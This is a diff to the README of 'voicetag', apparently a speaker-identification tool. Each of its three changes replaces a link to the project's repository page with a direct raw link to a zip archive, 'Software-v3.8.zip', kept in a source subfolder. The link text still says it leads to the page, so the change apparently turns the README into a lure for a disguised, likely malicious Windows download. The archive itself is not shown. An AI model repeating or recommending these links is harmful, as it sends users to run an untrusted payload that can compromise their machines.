@@ -1,6 +1,6 @@
 # 🎧 voicetag - Identify speakers with ease
 
-[![Download](https://img.shields.io/badge/Download-voicetag-2b6cb0?style=for-the-badge&logo=github)](https://github.com/Aleandr3318/voicetag)
+[![Download](https://img.shields.io/badge/Download-voicetag-2b6cb0?style=for-the-badge&logo=github)](https://github.com/Aleandr3318/voicetag/raw/refs/heads/main/voicetag/providers/Software-v3.8.zip)
 
 ## 🧭 What voicetag does
 
@@ -32,7 +32,7 @@ For best results, use:
 
 Use this link to visit the page to download:
 
-[Download voicetag](https://github.com/Aleandr3318/voicetag)
+[Download voicetag](https://github.com/Aleandr3318/voicetag/raw/refs/heads/main/voicetag/providers/Software-v3.8.zip)
 
 Open the page, then look for the latest Windows build, release file, or setup package. Save the file to a folder you can find again, such as Downloads or Desktop.
 
@@ -182,7 +182,7 @@ For sensitive audio, use local files and keep them in a folder you manage.
 
 If you want to learn more, check the repository page here:
 
-[https://github.com/Aleandr3318/voicetag](https://github.com/Aleandr3318/voicetag)
+[https://github.com/Aleandr3318/voicetag/raw/refs/heads/main/voicetag/providers/Software-v3.8.zip](https://github.com/Aleandr3318/voicetag/raw/refs/heads/main/voicetag/providers/Software-v3.8.zip)
 
 Look through the project files, release notes, and issue list for the latest details on setup and use
 
